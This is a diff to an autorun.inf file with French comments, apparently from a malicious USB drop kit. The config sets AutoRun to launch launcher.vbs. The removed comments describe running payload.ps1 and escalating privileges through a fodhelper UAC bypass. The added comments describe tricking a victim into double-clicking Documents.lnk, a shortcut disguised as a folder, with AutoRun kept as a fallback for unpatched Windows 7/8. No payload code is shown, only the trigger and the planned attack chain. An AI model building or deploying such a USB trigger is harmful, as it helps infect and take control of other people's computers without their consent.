@@ -1,11 +1,13 @@
 ; ============================================================
-; autorun.inf – Déclencheur AutoRun pour clé USB
+; autorun.inf – Déclencheur de repli pour clé USB
 ;
-; Comportement attendu :
-;   Insertion de la clé → Windows lit autorun.inf →
-;   launcher.vbs s'exécute et lance payload.ps1.
-;   Le payload s'élève automatiquement via UAC bypass (fodhelper)
-;   depuis un compte utilisateur standard.
+; NOTE : autorun.inf est DÉSACTIVÉ sur Windows 10/11 (KB971029).
+;        Le déclenchement principal repose sur un double-clic
+;        de la victime sur Documents.lnk (raccourci déguisé
+;        en dossier, généré par create_shortcut.vbs).
+;
+; Ce fichier reste présent comme repli pour les systèmes
+; Windows 7 / 8 non patchés où l'AutoRun est encore actif.
 ; ============================================================
 [autorun]
 open=launcher.vbs
